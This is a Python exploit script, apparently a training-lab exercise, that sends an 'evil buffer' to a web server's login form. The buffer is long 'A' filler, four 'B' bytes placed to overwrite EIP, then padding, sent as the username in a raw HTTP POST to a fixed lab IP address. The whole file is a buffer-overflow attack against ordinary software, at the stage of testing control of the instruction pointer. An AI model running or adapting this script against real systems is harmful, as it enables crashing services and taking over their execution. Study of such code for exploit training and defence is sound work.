#!/usr/bin/python3

import socket
import time
import sys

size = 780
bufSize = 1500
rhost = "192.168.211.10"
rport = 80

try:
    print ( "\nSending evil buffer with %s bytes" % size )
    filler = "A" * size
    eip = "B" * 4
    offset = "C" * 4
    buffer = "D" * (bufSize - len(filler) - len(eip) - len(offset))

    inputBuffer = filler + eip + offset + buffer
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: " + rhost + "\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://" + rhost + "/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: " + str( len( content ) )+ "\r\n"
    buffer += "\r\n"

    buffer += content
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((rhost,rport))
    s.send( bytes(buffer, 'utf-8') )
    s.close()
except:
    print ( "Could not connect!" )
    sys.exit()
